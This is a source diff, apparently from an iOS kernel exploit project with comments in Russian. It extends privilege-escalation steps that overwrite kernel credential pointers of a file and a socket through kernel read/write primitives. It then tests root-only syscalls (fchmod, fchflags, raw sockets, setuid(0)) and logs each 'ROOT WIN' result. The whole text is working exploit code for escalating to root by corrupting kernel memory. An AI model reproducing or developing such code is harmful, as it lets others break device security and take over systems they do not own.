@@ -2380,11 +2380,23 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             uint64_t old = early_kread64(glob + fgOff);
             early_kwrite64(glob + fgOff, rootZVA);
             uint64_t rb = early_kread64(glob + fgOff);
-            int ch = fchmod(tfd, 0644);   // одна проба, мгновенно
+            int ch = fchmod(tfd, 0644);
+            int eCh = errno;
+            // 2.0.58: расширенные f_cred-пробы (только syscall'ы, без лишних kwrite)
+            struct timespec ts[2] = {{0, UTIME_NOW}, {0, UTIME_NOW}};
+            int fu = futimens(tfd, ts);
+            int eFu = errno;
+            int fc = fchflags(tfd, 0);
+            int eFc = errno;
+            struct flock flk; memset(&flk, 0, sizeof(flk));
+            flk.l_type = F_WRLCK; flk.l_whence = SEEK_SET;
+            int lk = fcntl(tfd, F_GETLK, &flk);
+            int eLk = errno;
             early_kwrite64(glob + fgOff, old);   // restore СРАЗУ
-            kpNote(r, [NSString stringWithFormat:@"  [ATK] step8: fg swap readback=%#llx → fchmod=%d errno=%d → restored — %@",
-                      (unsigned long long)rb, ch, errno, ch == 0 ? @"ROOT-FS WIN ★★" : @"проба мимо (process-cred авторизация)"]);
-            if (ch == 0) kpNote(r, @"=== ROOT (filesystem) WIN ===");
+            kpNote(r, [NSString stringWithFormat:@"  [ATK] step8: fg swap readback=%#llx → fchmod=%d/e%d futimens=%d/e%d fchflags=%d/e%d fcntl=%d/e%d → restored — %@",
+                      (unsigned long long)rb, ch, eCh, fu, eFu, fc, eFc, lk, eLk,
+                      (ch == 0 || fu == 0 || fc == 0) ? @"ROOT-FS WIN ★★" : @"пробы мимо (process-cred)"]);
+            if (ch == 0 || fu == 0 || fc == 0) kpNote(r, @"=== ROOT (filesystem) WIN ===");
         } else {
             kpNote(r, @"  [ATK] step8: SKIPPED — type!=0x21, kwrite запрещён (апертура-фолт = ребут)");
         }
@@ -2428,15 +2440,21 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             // 2.0.53: пока so_cred=root — raw socket + setuid (может увидеть p_ucred)
             int rs = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
             int eRaw = errno;
+            int hdr = 0; // IP_HDRINCL на нашем UDP
+            int sh = setsockopt(ts, IPPROTO_IP, IP_HDRINCL, &hdr, sizeof(hdr));
+            int eHdr = errno;
+            int one = 1;
+            int st = setsockopt(ts, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one));
+            int eSt = errno;
             uid_t uBefore = getuid(), eBefore = geteuid();
             int su = setuid(0);
             int eSu = errno;
             uid_t uAfter = getuid(), eAfter = geteuid();
             early_kwrite64(sVA + socOff, old);   // restore СРАЗУ
             if (rs >= 0) close(rs);
-            kpNote(r, [NSString stringWithFormat:@"  [ATK] step11: so swap readback=%#llx → bind22=%d e=%d raw=%d e=%d setuid0=%d e=%d uid %u→%u euid %u→%u → restored — %@",
-                      (unsigned long long)rb, pBind, eBind, rs, eRaw, su, eSu,
-                      uBefore, uAfter, eBefore, eAfter,
+            kpNote(r, [NSString stringWithFormat:@"  [ATK] step11: so swap readback=%#llx → bind22=%d/e%d raw=%d/e%d hdrincl=%d/e%d reuseport=%d/e%d setuid0=%d/e%d uid %u→%u → restored — %@",
+                      (unsigned long long)rb, pBind, eBind, rs, eRaw, sh, eHdr, st, eSt, su, eSu,
+                      uBefore, uAfter,
                       pBind == 0 ? @"SOCKET-ROOT WIN ★★" : @"проба мимо"]);
             if (pBind == 0) kpNote(r, @"=== SOCKET-ROOT WIN ===");
             if (rs >= 0) kpNote(r, @"=== RAW-SOCKET WIN ★★ ===");
